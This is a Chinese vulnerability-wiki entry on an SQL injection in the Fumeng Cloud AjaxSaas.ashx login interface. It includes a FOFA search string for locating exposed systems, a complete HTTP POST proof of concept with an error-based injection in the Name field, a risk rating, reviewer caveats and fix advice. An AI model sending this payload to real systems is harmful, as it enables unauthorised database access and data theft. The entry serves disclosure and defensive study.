---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "孚盟云 AjaxSaas Login Name SQL 注入"
product: "孚盟云"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本"
prerequisites: "登录接口示例无会话"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E5%AD%9A%E7%9B%9F/%E5%AD%9A%E7%9B%9F%E4%BA%91%20AjaxSaas.ashx%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"孚盟软件-孚盟云\""
id: "vw-461f994890a0a73bb7ef8e7a"
entity_id: "ve-461f994890a0a73bb7ef8e7a"
schema_version: "1"
---

# 孚盟云 AjaxSaas Login Name SQL 注入

## 条目说明

- 对象与具体问题：孚盟云；AjaxSaas Login Name SQLi
- 版本、配置及部署条件：无版本
- 认证与权限前提：登录接口示例无会话
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 数值/@@version转换报错需响应原文，目前图未视检
- checkValidateCode=0是否验证码绕过独立条件未解
- 在野已知/DB完全控制属于无证泛化，缺修复build

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 漏洞描述

孚盟云 AjaxSaas.ashx SQL注入漏洞，攻击者可以利用该漏洞执行任意 SQL 查询，可能导致敏感数据泄露或数据库被完全控制。

## 影响版本

孚盟软件-孚盟云

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：app="孚盟软件-孚盟云"

POC/EXP：

```http
POST /Ajax/AjaxSaas.ashx HTTP/1.1
Host: 127.0.0.1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded

action=Login&Name=2'+and+1=@@version--+&pwd=1&validateCode=&checkValidateCode=0


```

![image-20250328223432507](./.resource/孚盟云AjaxSaas.ashxSQL注入漏洞/media/image-20250328223432507.png)


## 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
